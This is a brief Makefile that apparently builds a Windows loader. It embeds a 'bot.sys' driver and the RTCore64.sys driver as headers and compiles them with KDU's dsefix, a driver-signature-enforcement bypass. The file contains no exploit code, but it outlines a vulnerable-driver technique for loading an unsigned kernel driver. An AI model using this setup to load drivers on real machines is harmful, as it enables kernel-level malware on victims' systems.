.PHONY: all rtcore64 clean

DEBUG ?= 1

CFLAGS := -DDEBUG
ifndef DEBUG
CFLAGS := -s
endif

FILES := loader.c driver.c util.c KDU/hde/hde64.c KDU/dsefix.c

all:
	#gcc loader.c -nostdlib -nostartfiles -e DllMain -shared -lkernel32 -o loader.dll $(CFLAGS)
	../tools/bin2hex.exe ../bot/bot.sys bot.h
	gcc $(FILES) -lntdll -lkernel32 -o loader.exe $(CFLAGS)
	cp loader.exe /d/Shared/

rtcore64:
	../tools/bin2hex.exe RTCore64.sys rtcore64.h

clean:
	rm -f *.o *.exe
